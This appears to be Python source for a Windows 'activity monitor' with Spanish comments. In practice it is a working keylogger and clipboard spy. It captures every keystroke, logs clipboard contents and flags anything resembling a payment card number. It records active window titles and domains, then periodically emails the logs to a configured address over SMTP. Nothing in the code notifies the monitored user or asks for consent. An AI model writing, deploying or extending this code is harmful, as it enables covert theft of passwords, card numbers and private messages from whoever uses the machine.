import os
import time
import json
import re
import shutil
import psutil
import pyperclip
import win32gui
import win32process
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from datetime import datetime, timezone
from threading import Lock, Thread
from pynput import keyboard
from config import CONFIG

# Rutas de archivos
STRUCTURED_LOG = os.path.join(CONFIG['log_dir'], 'activity.jsonl')
TEXT_REPORT = os.path.join(CONFIG['log_dir'], 'reporte_actividades.txt')

# Asegurar que exista el directorio para el ejecutable
os.makedirs(CONFIG['exe_path'], exist_ok=True)

# Variables globales
LOG_LOCK = Lock()
current_text = ""
keyboard_lock = Lock()
last_keyboard_log = time.time()

# Inicialización
os.makedirs(CONFIG['log_dir'], exist_ok=True)

def get_window_info():
    """Obtiene información de la ventana activa"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return title, process.name(), process.exe()
    except:
        return None, None, None

def extract_domain(title):
    """Extrae dominio de URLs"""
    if not title:
        return None
    match = re.search(r"(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+(?:\.[a-zA-Z]{2,})+)", title)
    return match.group(1).lower() if match else None

def categorize_app(app_name):
    """Categoriza aplicaciones"""
    if not app_name:
        return "unknown"
    app_lower = app_name.lower()
    productive = ['code', 'studio', 'terminal', 'docs', 'outlook', 'teams']
    unproductive = ['game', 'social', 'media', 'chat', 'video', 'music']
    
    if any(kw in app_lower for kw in productive):
        return 'productive'
    elif any(kw in app_lower for kw in unproductive):
        return 'unproductive'
    return 'neutral'

def detect_content_type(content):
    """Detecta tipo de contenido"""
    if not isinstance(content, str):
        return "binary"
    if re.match(r"^https?://", content):
        return "url"
    elif re.search(r"\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}", content):
        return "payment_card"
    elif "@" in content and "." in content:
        return "email" 
    elif len(content) > 100:
        return "long_text"
    return "text"

def rotate_logs():
    """Rotación de archivos de log"""
    for i in range(CONFIG['log_rotation']-1, 0, -1):
        src, dst = f"{STRUCTURED_LOG}.{i}", f"{STRUCTURED_LOG}.{i+1}"
        if os.path.exists(src):
            shutil.move(src, dst)
    if os.path.exists(STRUCTURED_LOG):
        shutil.move(STRUCTURED_LOG, f"{STRUCTURED_LOG}.1")

def log_entry(event_type, data):
    """Registra entrada de log y actualiza reporte"""
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "type": event_type,
        "data": data,
        "system": {
            "cpu_percent": psutil.cpu_percent(),
            "memory_used": psutil.virtual_memory().percent,
            "user": os.getlogin()
        }
    }
    
    # Rotación si es necesario
    if os.path.exists(STRUCTURED_LOG) and os.path.getsize(STRUCTURED_LOG) > CONFIG['max_log_size']:
        rotate_logs()
    
    try:
        with LOG_LOCK:
            with open(STRUCTURED_LOG, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
            print(f"📝 {event_type} registrado")
            update_text_report()
    except Exception as e:
        print(f"❌ Error en log: {e}")

def update_text_report():
    """Actualiza el reporte de texto"""
    try:
        if not os.path.exists(STRUCTURED_LOG):
            return

        with open(STRUCTURED_LOG, 'r', encoding='utf-8') as f:
            entries = [json.loads(line) for line in f if line.strip()]
        
        if not entries:
            return

        report = f"""=== REGISTRO DE ACTIVIDADES ===
Última actualización: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total de entradas: {len(entries)}

"""
        
        for entry in entries:
            timestamp = datetime.fromisoformat(entry['timestamp'].replace('Z', '+00:00'))
            hora = timestamp.strftime('%Y-%m-%d %H:%M:%S')
            
            if entry['type'] == 'WINDOW_ACTIVITY':
                app = entry['data']['application']
                window = entry['data']['window']
                report += f"[{hora}] Ventana - {app['name']} ({app['category']})\n"
                report += f"  Título: {window['title']}\n"
                if window['domain']:
                    report += f"  Dominio: {window['domain']}\n"
                report += "\n"
            
            elif entry['type'] in ['CLIPBOARD', 'KEYBOARD']:
                data = entry['data']
                tipo = "Portapapeles" if entry['type'] == 'CLIPBOARD' else "Teclado"
                report += f"[{hora}] {tipo} - {data['content_type']}\n"
                report += f"  Contenido: {data['content'][:100]}{'...' if len(data['content']) > 100 else ''}\n\n"

        with open(TEXT_REPORT, 'w', encoding='utf-8') as f:
            f.write(report)
            
    except Exception as e:
        print(f"❌ Error actualizando reporte: {e}")

def track_activity():
    """Monitor de actividad de ventanas"""
    last_entry = None
    while True:
        try:
            window_title, app_name, exe_path = get_window_info()
            
            entry = {
                "application": {
                    "name": app_name,
                    "path": exe_path,
                    "category": categorize_app(app_name)
                },
                "window": {
                    "title": window_title,
                    "domain": extract_domain(window_title)
                }
            }

            # Solo registrar si cambió la app o dominio
            if (not last_entry or 
                entry['application']['name'] != last_entry['application']['name'] or
                entry['window']['domain'] != last_entry['window']['domain']):
                log_entry('WINDOW_ACTIVITY', entry)
                last_entry = entry
            
            time.sleep(2)
        except Exception as e:
            print(f"Error actividad: {e}")
            time.sleep(10)

def track_clipboard():
    """Monitor del portapapeles"""
    last_content = ""
    while True:
        try:
            current_content = pyperclip.paste()
            
            if current_content and current_content != last_content and current_content.strip():
                log_entry('CLIPBOARD', {
                    "content": current_content,
                    "content_type": detect_content_type(current_content),
                    "length": len(current_content)
                })
                last_content = current_content
                
            time.sleep(0.5)
        except Exception as e:
            print(f"Error portapapeles: {e}")
            time.sleep(5)

def on_press(key):
    """Maneja teclas presionadas"""
    global current_text, last_keyboard_log
    try:
        with keyboard_lock:
            if hasattr(key, 'char') and key.char:
                current_text += key.char
            elif key == keyboard.Key.space:
                current_text += " "
            elif key == keyboard.Key.enter:
                current_text += "\n"
            elif key == keyboard.Key.backspace and current_text:
                current_text = current_text[:-1]
            
            # Registrar cada 50 caracteres, al presionar enter, o cada 5 segundos
            current_time = time.time()
            if (len(current_text) >= 50 or 
                key == keyboard.Key.enter or 
                (current_text.strip() and current_time - last_keyboard_log >= 5)):
                
                if current_text.strip():
                    log_entry('KEYBOARD', {
                        "content": current_text,
                        "content_type": "text",
                        "length": len(current_text)
                    })
                current_text = ""
                last_keyboard_log = current_time
                
    except Exception as e:
        print(f"Error teclado: {e}")

def track_keyboard():
    """Monitor del teclado"""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_email_report():
    """Envía reporte por email"""
    try:
        email_cfg = CONFIG['email']
        
        msg = MIMEMultipart()
        msg['From'] = email_cfg['sender']
        msg['To'] = email_cfg['recipient']
        msg['Subject'] = f"Reporte Actividades - {datetime.now().strftime('%Y-%m-%d %H:%M')}"

        body = f"Reporte generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        msg.attach(MIMEText(body, 'plain'))

        # Adjuntar archivos
        for filepath, filename in [(TEXT_REPORT, 'reporte.txt'), (STRUCTURED_LOG, 'activity.jsonl')]:
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    attachment = MIMEApplication(f.read())
                    attachment.add_header('Content-Disposition', 'attachment', filename=filename)
                    msg.attach(attachment)

        # Enviar
        with smtplib.SMTP(email_cfg['smtp_server'], email_cfg['smtp_port']) as server:
            server.starttls()
            server.login(email_cfg['sender'], email_cfg['password'])
            server.send_message(msg)
            print("Email enviado")
            
    except Exception as e:
        print(f"Error email: {e}")

def main():
    """Función principal"""
    print("Iniciando monitor de actividades")
    print(f"Logs en: {CONFIG['log_dir']}")
    
    # Crear archivo inicial
    with open(TEXT_REPORT, 'w', encoding='utf-8') as f:
        f.write(f"=== REGISTRO DE ACTIVIDADES ===\nIniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Iniciar hilos
    threads = [
        Thread(target=track_activity, daemon=True),
        Thread(target=track_clipboard, daemon=True),
        Thread(target=track_keyboard, daemon=True)
    ]
    
    for thread in threads:
        thread.start()
        print(f" Hilo iniciado")
        time.sleep(0.2)
    
    # Loop principal
    last_email = time.time()
    try:
        while True:
            if time.time() - last_email >= CONFIG['email_interval']:
                send_email_report()
                last_email = time.time()
            time.sleep(60)
            
    except KeyboardInterrupt:
        print("\n Deteniendo sistema...")
        update_text_report()
        send_email_report()
        print("Sistema detenido")

if __name__ == "__main__":
    main()